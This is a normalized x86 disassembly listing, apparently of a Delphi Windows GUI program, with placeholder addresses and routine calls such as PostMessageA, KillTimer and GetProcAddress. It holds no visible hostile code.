mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_4499c1
jmp sub_40387c
sub_4499c8
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449ac8
jmp sub_40387c
sub_449acf
pop ebp
retn
sub_44c254
mov eax [ rw-data ]
retn
sub_44c25c
mov [ rw-data ] eax
retn
sub_44c3a4
jmp sub_4035c8
sub_44c3db
jmp sub_40387c
sub_44c3e2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c6ea
jmp sub_40387c
sub_44c6f1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c795
jmp sub_40387c
sub_44c79c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c82c
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_44cf58
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44d604
sub_44cf74
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44cf58
sub_44d094
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44d604
sub_44d0ac
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44d604
sub_44d0c4
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44d604
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44d0f0
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_44d0fc
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44d604
retn
sub_44d3dc
push ebx
mov ebx edx
mov edx ebx
call sub_43821c
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44d44c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_44d574
jmp sub_40387c
sub_44d57b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d584
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44c990
mov eax [ ebx + 0x20c ]
call sub_44c990
sub_44d5e4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44d5f4
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44d6ef
jmp sub_40387c
sub_44d6fc
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44d714
sub_44d930
retn
sub_44d99e
jmp sub_40387c
sub_44d9dd
jmp sub_40387c
sub_44da10
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_439714
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44cc1c
retn
sub_44da34
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_439734
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44cc1c
retn
sub_44db29
jmp sub_40387c
sub_44db30
mov eax [ ebp - 0x4 ]
call sub_43b694
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44c884
mov eax [ ebp - 0x4 ]
call sub_44d604
sub_44dc08
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_438930
sub_44dc1c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44dd5c
jmp sub_40387c
sub_44dd94
jmp sub_40387c
sub_44dd9b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ddbb
lea eax [ ebp - 0x114 ]
call sub_403e78
retn
sub_44ddb4
jmp sub_40387c
sub_44ddbb
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_44e0c2
jmp sub_40387c
sub_44e0c9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40349c
sub_44e11d
jmp sub_4035c8
j_sub_4035c8#9
jmp sub_4035c8
sub_44e19e
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e556
jmp sub_40387c
sub_44e55d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e638
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417650
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_44e650
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e688
mov edx eax
mov eax esi
call sub_418ed8
pop esi
pop ebx
retn
sub_44e66c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fa2c
mov edx eax
mov eax esi
call sub_418ed8
pop esi
pop ebx
retn
sub_44e688
push ebx
mov ebx eax
mov eax ebx
call sub_44f6cc
mov edx r-xdata
call sub_41d2f8
pop ebx
retn
sub_44e78c
push ebx
mov ebx eax
mov eax ebx
call sub_44e79c
xor al 0x1
pop ebx
retn
sub_44e79c
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44e7f8
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_44e818
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_44e838
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_44eb31
jmp sub_40387c
sub_44eb38
pop ecx
pop ebp
retn
sub_44eb3c
xor eax eax
retn
sub_44ee14
jmp sub_40387c
sub_44ee1b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_44ee31
jmp sub_40387c
sub_44ef1b
jmp sub_40387c
sub_44ef22
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ef3f
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_44ef38
jmp sub_40387c
sub_44ef5f
jmp sub_40387c
sub_44f24a
jmp sub_40387c
sub_44f3dd
jmp sub_40387c
sub_44f6cc
mov eax [ eax + 0x238 ]
retn
sub_44f6d4
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44f6e0
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_44fa1e
jmp sub_40387c
sub_44fa25
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fa2c
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_44fa74
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_438930
sub_44fa90
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_44facc
push ebx
mov ebx eax
mov eax ebx
call sub_43a8c4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41cd48
sub_44fb50
push ebx
mov ebx eax
mov eax ebx
call sub_43a8ec
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d39c
sub_44fb70
push ebx
mov ebx eax
mov eax ebx
call sub_44f790
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_44f858
pop ebx
retn
sub_45039d
lea eax [ ebp - 0xb4 ]
call sub_403e78
retn
sub_4503a9
jmp sub_40387c
j_sub_45039d
jmp sub_45039d
sub_4503b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450508
jmp sub_40387c
sub_45050f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4507f4
jmp sub_40387c
sub_4507fb
mov eax [ rw-data ]
call sub_4530ac
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450812
add [ eax ] al
retn
sub_450a70
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_450a90
mov eax [ eax + 0x240 ]
call sub_422a88
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_454e4c
sub_450b37
jmp sub_40387c
sub_450b3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b61
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d374
retn
sub_450b5a
jmp sub_40387c
sub_450b61
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450d20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a90
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_450f88
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44835c
sub_451073
jmp sub_40387c
sub_45107a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451080
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_450868
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_4510d8
call sub_451e00
retn
sub_451525
jmp sub_40387c
sub_45152c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4035c8#8
jmp sub_4035c8
j_sub_4035c8#7
jmp sub_4035c8
sub_451cbd
jmp sub_40387c
sub_451cc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451ce1
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_451cda
jmp sub_40387c
sub_451ce1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451ce8
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_422a88
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44e730
sub_451d08
call sub_403128
retn
sub_451d60
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_451dc6
jmp sub_40387c
sub_451f74
jmp sub_4035c8
sub_451fa0
xor edx edx
call sub_44ea94
retn
sub_451fa8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_44ea94
mov eax ebx
call sub_434e14
pop ebx
retn
sub_45202e
jmp sub_40387c
sub_452035
pop ebx
pop ecx
pop ebp
retn
sub_45203c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43b390
push eax
call PostMessageA
pop ebx
retn
sub_452240
jmp sub_40387c
sub_4522e1
jmp sub_40387c
sub_4522eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45230a
mov eax [ rw-data ]
call sub_454524
retn
sub_452303
jmp sub_40387c
sub_45230a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452327
lea eax [ ebp - 0x20 ]
call sub_403e78
retn
sub_452320
jmp sub_40387c
sub_452327
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452408
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_433fc0
retn
mov edx eax
mov eax [ rw-data ]
call sub_453b78
retn
sub_45278c
mov edx eax
mov eax [ rw-data ]
call sub_455598
mov al 0x1
retn
sub_452874
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45279c
sub_452888
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45279c
sub_45289c
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45279c
sub_4528b0
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45279c
sub_4528c4
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_452a2f
jmp sub_40387c
sub_452a36
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452a3c
push ebx
mov ebx eax
mov eax ebx
call sub_439ca8
mov eax ebx
call sub_439e2c
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45203c
sub_452cb2
jmp sub_40387c
sub_452cb9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452cc0
push ebx
mov ebx edx
mov edx ebx
call sub_43a110
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_4340c8
pop ebx
retn
sub_452d14
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452d7c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_452d2c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452d7c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_452d48
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452d7c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_452d60
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_452d7c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_452ffc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_453008
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_453014
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_453020
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45302c
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_453038
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_453044
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4138b8
pop esi
pop ebx
retn
sub_453058
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_453074
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4138b8
pop esi
pop ebx
retn
sub_453088
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_453090
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4138b8
pop esi
pop ebx
retn
sub_4530a4
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_453180
mov eax [ eax + 0x54 ]
call sub_41375c
retn
sub_45318c
mov eax [ eax + 0x54 ]
call sub_4139fc
retn
sub_4533df
jmp sub_40387c
sub_453423
jmp sub_40387c
sub_45342a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_453478
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453278
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403ecc
pop esi
pop ebx
retn
sub_4534e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4138b8
pop esi
pop ebx
retn
sub_4534f8
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4536fd
jmp sub_40387c
sub_453704
pop ebx
mov esp ebp
pop ebp
retn
sub_45370c
inc [ eax + 0x8c ]
retn
sub_453714
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_453734
sub_453734
xor edx edx
call sub_453b78
retn
sub_453b6a
jmp sub_40387c
sub_453bf1
jmp sub_40387c
sub_453c00
add eax 0x30
call sub_40cc70
retn
sub_453c44
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_453c95
jmp sub_4035c8
sub_453c9a
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_454369
jmp sub_40387c
sub_454370
pop ebx
mov esp ebp
pop ebp
retn
sub_4544f8
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_454524
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_454550
xor edx edx
call sub_454448
retn
sub_454558
mov dl 0x1
call sub_454448
retn
sub_4545cc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4545e4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4546b1
jmp sub_40387c
sub_4546b8
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4035c8#6
jmp sub_4035c8
sub_455400
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4035c8#5
jmp sub_4035c8
j_sub_4035c8#4
jmp sub_4035c8
sub_455576
jmp sub_40387c
sub_45557d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455584
call sub_40c7c0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45577d
jmp sub_40387c
sub_455784
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45584b
jmp sub_40387c
sub_455852
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455a28
jmp sub_40387c
sub_455a2f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455a90
jmp sub_40387c
sub_455a97
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455aa0
call sub_455868
retn
j_sub_4035c8#3
jmp sub_4035c8
sub_455ce4
jmp sub_40387c
sub_455ceb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455e19
jmp sub_40387c
sub_455f78
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_456277
jmp sub_40387c
sub_4562a6
jmp sub_40387c
sub_4563b2
jmp sub_40387c
sub_4563b9
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45674a
jmp sub_40387c
sub_456751
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456874
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4568bf
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_4568d0
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4568e0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_456953
jmp sub_40387c
sub_45695a
pop ebp
retn
sub_45695c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4568f0
call sub_403c4c
call sub_456874
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44c530
call sub_4133ac
sub_456daa
jmp sub_40387c
sub_456db1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_456f29
jmp sub_40387c
sub_456f30
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456f7d
jmp sub_40387c
sub_456f84
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457195
jmp sub_40387c
sub_45719c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45736e
jmp sub_40387c
sub_457375
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4573a5
jmp sub_40387c
sub_4573ac
pop ebp
retn
sub_4573b0
sub [ rw-data ] 0x1
retn
sub_4577b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43622c
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_457834
push ebx
mov ebx eax
mov eax ebx
call sub_439ac4
mov eax ebx
call sub_457bd4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_458064
sub_4578b0
jmp sub_40387c
sub_4578b7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457910
jmp sub_40387c
sub_457917
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4579a4
jmp sub_40387c
sub_4579ab
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457aaa
jmp sub_40387c
sub_457ab1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457bc6
jmp sub_40387c
sub_457bcd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457bd4
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_457c99
jmp sub_40387c
sub_457ca0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457d74
mov eax [ eax + 0x208 ]
retn
sub_457fc2
jmp sub_40387c
sub_458054
jmp sub_40387c
sub_45805b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4580a4
xor edx edx
call sub_4579b4
retn
sub_4580ac
mov al 0x1
retn
sub_45829d
jmp sub_40387c
sub_4582a4
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45848a
jmp sub_40387c
sub_458491
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4584d0
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_458514
mov edx eax
mov eax ebx
call sub_457df4
pop ebx
retn
sub_458724
jmp sub_40387c
sub_45872b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4587b7
jmp sub_40387c
sub_4587be
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458845
jmp sub_40387c
sub_45884c
pop ebx
mov esp ebp
pop ebp
retn
sub_458952
jmp sub_40387c
sub_458959
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458baa
jmp sub_40387c
sub_458bb1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458c54
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_458d3a
jmp sub_40387c
sub_458d41
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458ffe
jmp sub_40387c
sub_459005
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_459418
jmp sub_40387c
sub_45941f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4594ad
jmp sub_40387c
sub_4594b4
pop ebp
retn
sub_4594b8
sub [ rw-data ] 0x1
retn
sub_45a938
cmp eax [ ecx ]
jl r-xdata
xor eax eax
retn
cmp eax [ ecx + 0x8 ]
jg r-xdata
cmp edx [ ecx + 0x4 ]
jl r-xdata
cmp edx [ ecx + 0xc ]
jle r-xdata
mov al 0x1
retn
sub_45aca3
jmp sub_40387c
sub_45acaa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45adc4
push ebx
mov ebx edx
mov edx ebx
call sub_42e2a8
or [ ebx + 0x4 ] 0x4
pop ebx
retn
sub_45add4
mov [ eax + 0x240 ] edx
retn
sub_45addc
retn
sub_45ae68
push esi
mov eax [ eax + 0x240 ]
mov si 0xffe9
call sub_403324
pop esi
retn
sub_45aeb0
push esi
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403324
pop esi
retn
sub_45b388
push esi
push ecx
mov [ esp ] cl
mov cl [ esp ]
mov eax [ eax + 0x240 ]
mov si 0xffbb
call sub_403324
pop edx
pop esi
retn
sub_45b41c
push ebx
mov ebx eax
push 0xffffffff
push 0x7fffffff
push 0xb1
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop ebx
retn
sub_45b630
xor ecx ecx
call sub_45b528
retn
sub_45b638
mov cl 0x1
call sub_45b528
retn
sub_45b6ec
jmp sub_40387c
sub_45b6f3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b9ac
jmp sub_40387c
sub_45b9b3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45bb58
push ebx
mov ebx eax
mov eax ebx
call sub_439ccc
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45bc84
sub_45bb98
mov al 0x1
retn
sub_45bb9c
mov al 0x1
retn
sub_45bba0
mov al [ eax + 0x219 ]
retn
sub_45bc54
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403e78
pop ebp
retn 0x4
sub_45bc64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403e78
pop ebp
retn 0x4
sub_45bc74
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_45bc7c
xor eax eax
retn
sub_45bc80
xor eax eax
retn
sub_45bc84
mov [ eax + 0x28d ] 0x0
call sub_46030c
retn
sub_45bc94
mov [ eax + 0x28d ] 0x1
call sub_4603e8
retn
sub_45bfdc
retn
sub_45c064
retn
sub_45c068
mov al 0x1
retn
sub_45c06c
retn
sub_45c108
xchg ecx edx
push edi
mov edi eax
mov eax edx
[ edi ]
pop edi
retn
sub_45d636
jmp sub_4035c8
sub_45d851
jmp sub_40387c
sub_45d858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d875
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_45d86e
jmp sub_40387c
sub_45d875
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45d9e0
jmp sub_40387c
sub_45d9e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da04
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_45d9fd
jmp sub_40387c
sub_45da04
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dce4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_45e4f9
jmp sub_40387c
sub_45e500
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45e560
push ebp
mov ebp esp
call sub_45dce4
pop ebp
retn 0x4
sub_45e56c
push ebp
mov ebp esp
call sub_45dce4
pop ebp
retn 0x4
sub_45ee02
jmp sub_40387c
sub_45ee3c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ad64
retn
j_sub_4035c8
jmp sub_4035c8
sub_45f7d0
cmp [ ebp - 0x11 ] 0x0
je r-xdata
call sub_403930
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
